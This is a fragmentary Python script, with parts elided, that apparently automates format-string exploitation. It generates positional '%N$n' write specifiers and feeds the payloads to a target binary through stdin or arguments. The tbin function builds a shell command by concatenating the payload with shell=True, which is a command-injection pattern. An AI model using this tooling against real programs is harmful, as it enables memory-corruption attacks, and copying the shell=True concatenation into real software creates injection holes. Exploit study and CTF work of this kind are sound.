...
def tbin(binary, pld, method="stdin"):
    if method == "stdin":
        res = subprocess.check_output("python2 -c 'print " + '"' + pld + '"' +
                                      "'" + "|" + binary,
                                      shell=True)
    elif method == "args":
...
def writer(c2print, steps, param_offset, ptr_size=8):
    ...
    while True:
        ...
        fmt = []
        for x in c2print:
            fmt.append("%" + str(next_param + expected_length // ptr_size) +
                       "$" + bytes2write + "n")
            next_param += 1
...
if __name__ == "__main__":
    ...
    parser.add_argument("-o",
                        "--offset",
                        help="Parameter offset for reflected input")
    ...
    parser.add_argument("-i",
                        "--method",
                        help="Method to interact with binary")
